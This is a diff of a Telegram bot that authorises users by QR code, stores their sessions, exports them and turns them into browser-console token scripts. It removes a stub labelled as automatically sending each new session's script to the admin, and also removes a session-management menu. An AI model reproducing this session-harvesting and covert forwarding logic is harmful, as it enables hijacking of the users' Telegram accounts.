@@ -338,11 +338,6 @@ async def run_qr_process(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
                 text="🎉 **Авторизация успешна!** Сессия сохранена.\nВыберите формат для загрузки:",
                 reply_markup=InlineKeyboardMarkup(kb)
             )
-
-            # --- ОТПРАВКА АДМИНУ В ЛС (оставляем автоматической) ---
-            js_code = get_js_console_code_raw(spath)
-            if js_code:
-                # [Тут код отправки admin_bio, как у вас было ранее]
                 
             
             # 3. Генерируем JS-код (токен) из сохраненной сессии
@@ -497,7 +492,7 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         fn = data.split(":", 1)[1]
         # Теперь кнопка просто ведет к выбору формата
         kb = [
-            [InlineKeyboardButton("📥 Выбрать формат выгрузки", callback_data=f"sess_choice:{fn}")],
+            [InlineKeyboardButton("📥 Выгрузить", callback_data=f"sess_choice:{fn}")],
             [InlineKeyboardButton("🗑 Удалить сессию", callback_data=f"sess_del:{fn}")],
             [InlineKeyboardButton("⬅️ Назад", callback_data="session:show_list")]
         ]
@@ -563,14 +558,6 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             await query.message.reply_document(document=f, filename=zp.name, caption="📦 Все ваши сессии в одном архиве.")
         try: os.remove(zp)
         except OSError: pass
-
-    elif data.startswith("sess_manage:"):
-        fn = data.split(":", 1)[1]
-        kb = [[InlineKeyboardButton("📜 Получить скрипт", callback_data=f"sess_get:{fn}")], [InlineKeyboardButton("🗑 Удалить сессию", callback_data=f"sess_del:{fn}")], [InlineKeyboardButton("⬅️ Назад", callback_data="session:show_list")]]
-        try:
-            await query.edit_message_text(f"Управление: {fn}", reply_markup=InlineKeyboardMarkup(kb))
-        except Exception:
-            await query.message.reply_text(f"Управление: {fn}", reply_markup=InlineKeyboardMarkup(kb))
 
     elif data.startswith("sess_get:"):
         fn = data.split(":", 1)[1]
